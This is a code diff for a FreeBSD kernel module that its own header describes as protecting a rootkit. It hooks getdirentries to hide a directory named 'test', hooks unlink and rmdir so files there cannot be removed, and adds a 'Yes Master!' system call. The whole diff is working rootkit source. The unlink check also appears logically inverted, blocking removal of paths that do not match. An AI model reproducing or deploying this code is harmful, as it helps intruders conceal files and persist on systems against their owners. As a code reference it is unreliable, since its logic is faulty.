@@ -1,8 +1,8 @@
 /*
  * Name:
- *      File Protector Hook
+ *      Protector
  * Description:
- *      A system call module that protects files
+ *      A system call module that protects the rootkit
  * Usage:
  *      TODO: Add usage here
  * Author:
@@ -32,11 +32,75 @@
 
 /* Options */
 #define KERNDEBUG 1
+#define HIDDENDIR "test"
 
-/* getdirentries hook */
+/* protector implementing function */
+static int protector(struct thread *td, void *syscall_args)
+{
+    uprintf("Yes Master! Welcome!\n");
+    return (0);
+}
+
+/* unlink hook - prevent file removal */
+static int unlink_hook(struct thread *td, void *syscall_args)
+{
+    struct unlink_args /* {
+            const char *path //path to the file to be removed
+            }*/*args;
+    args = (struct unlink_args *)syscall_args;
+
+    /* Copy arguments to kernel space */
+    char path[NAME_MAX];
+    size_t copied;
+    if (copyinstr(args->path, path, NAME_MAX, &copied) == EFAULT)
+        /* Error Copying Path */
+        return (EFAULT);
+
+    /* All files under HIDDENDIR should be protected */
+    size_t dirsize = sizeof(HIDDENDIR);
+    char buf[dirsize + 1]; //With \0 termination
+    bcopy(path, buf, dirsize);
+    buf[dirsize] = '\0';
+    uprintf("path=%s\n", path);
+    uprintf("buf=%s\n", buf);
+    if(strcmp(buf, HIDDENDIR)) {
+        uprintf("YES!!!\n");
+        /* return no such file or directory */
+        return (ENOENT);
+    }
+
+    /* Otherwise, call the original system call */
+    return (sys_unlink(td, syscall_args));
+}
+
+/* rmdir hook - Prevent directory removal */
+static int rmdir_hook(struct thread *td, void *syscall_args)
+{
+    struct rmdir_args /* {
+            const char *path
+            }*/*args;
+    args = (struct rmdir_args *)syscall_args;
+
+    /* Copy arguments to kernel space */
+    char path[NAME_MAX];
+    size_t copied;
+    if (copyinstr(args->path, path, NAME_MAX, &copied) == EFAULT)
+        /* Error Copying Path */
+        return (EFAULT);
+
+    /* Check if the directory to be deleted matches the HIDDENDIR */
+    if (strstr(path, HIDDENDIR)) {
+        /* As long as the path contains the hidden directory name */
+        return (ENOENT);
+    }
+
+    /* Otherwise, call the original system call */
+    return (sys_rmdir(td, syscall_args));
+}
+
+/* getdirentries hook - hide file/directory */
 static int getdirentries_hook(struct thread *td, void *syscall_args)
 {
-    char hide[]="test";
     struct getdirentries_args /* {
                 int fd, //[man]file descriptor
                 char *buf, //[man]buffer space, results will be returned to here
@@ -55,7 +119,7 @@ static int getdirentries_hook(struct thread *td, void *syscall_args)
                 u_int8_t d_namelen, //[man]Length of the filename excluding null byte.
                 char d_name[MAXNAMELEN + 1] //[man]Null terminated file name
                 }*/*dirptr, *currptr;
-    unsigned int tbytes, count, length;
+    unsigned int tbytes, count, reclen;
     int flag = 0;
 
     /* call the original getdirentries */
@@ -75,17 +139,19 @@ static int getdirentries_hook(struct thread *td, void *syscall_args)
 
         /* Iterate through the directory entries */
         while (count > 0) {
-            length = currptr->d_reclen;
-            count -= length;
+            reclen = currptr->d_reclen;
+            count -= reclen;
 
-            /* Check if the entry name mathes the hide config */
-            if (strcmp((char *)&(currptr->d_name), (char *)&hide) == 0){
+            /* Check if the entry name matches the hide config */
+            if (strcmp((char *)&(currptr->d_name), (char *)HIDDENDIR) == 0){
+                /* If the currptr is pointing to the last entry, no need to remove */
                 if (count != 0) {
-                    bcopy((char *)currptr + length, currptr, count); //Remove it from the result
+                    /* Copy the rest of entries to the address of current node, overwrite the hidden file */
+                    bcopy((char *)currptr + reclen, currptr, count);
                     flag = 1;
                 }
                 /* Modify transferred bytes */
-                tbytes -= length;
+                tbytes -= reclen;
             }
 
             /* The last directory entry always has a d_reclen of 0. Check to avoid infinite loop */
@@ -95,9 +161,9 @@ static int getdirentries_hook(struct thread *td, void *syscall_args)
             }
 
             /* Check if there's anymore to loop */
-            if (count !=0 && flag ==0) {
-                /* Point the currptr to the next entry using d_reclen(length) */
-                currptr = (struct dirent *)((char *)currptr + length);
+            if (count != 0 && flag == 0) {
+                /* Point the currptr to the next entry using d_reclen */
+                currptr = (struct dirent *)((char *)currptr + reclen);
             }
             flag = 0;
         }
@@ -116,8 +182,8 @@ static int getdirentries_hook(struct thread *td, void *syscall_args)
 
 /* Prepare sysent to register the new system call */
 static struct sysent getdirentries_hook_sysent = {
-    4,  /* Number of arguments */
-    getdirentries_hook /* implementing function */
+    1,  /* Number of arguments */
+    protector /* implementing function */
 };
 
 /* Define the offset in sysent[] where the new system call is to be allocated */
@@ -131,15 +197,19 @@ static int load(struct module *module, int cmd, void *arg)
     switch(cmd) {
         case MOD_LOAD:
             #if KERNDEBUG == 1
-            uprintf("System call loaded at offset %d.\n", offset);
+            uprintf("Hooking getdirentries, unlink, rmdir....\n");
             #endif
             sysent[SYS_getdirentries].sy_call = (sy_call_t *)getdirentries_hook;
+            sysent[SYS_unlink].sy_call = (sy_call_t *)unlink_hook;
+            sysent[SYS_rmdir].sy_call = (sy_call_t *)rmdir_hook;
             break;
         case MOD_UNLOAD:
             #if KERNDEBUG == 1
-            uprintf("System call unloaded from offset %d.\n", offset);
+            uprintf("Unhooking getdirentries, unlink, rmdir....\n");
             #endif
             sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries;
+            sysent[SYS_unlink].sy_call = (sy_call_t *)sys_unlink;
+            sysent[SYS_rmdir].sy_call = (sy_call_t *)sys_rmdir;
             break;
         default:
             error = EOPNOTSUPP; /* Operation not supported */
@@ -150,4 +220,4 @@ static int load(struct module *module, int cmd, void *arg)
 }
 
 /* Declare and register the system call module */
-SYSCALL_MODULE(file_protector, &offset, &getdirentries_hook_sysent, load, NULL);
+SYSCALL_MODULE(protector, &offset, &getdirentries_hook_sysent, load, NULL);
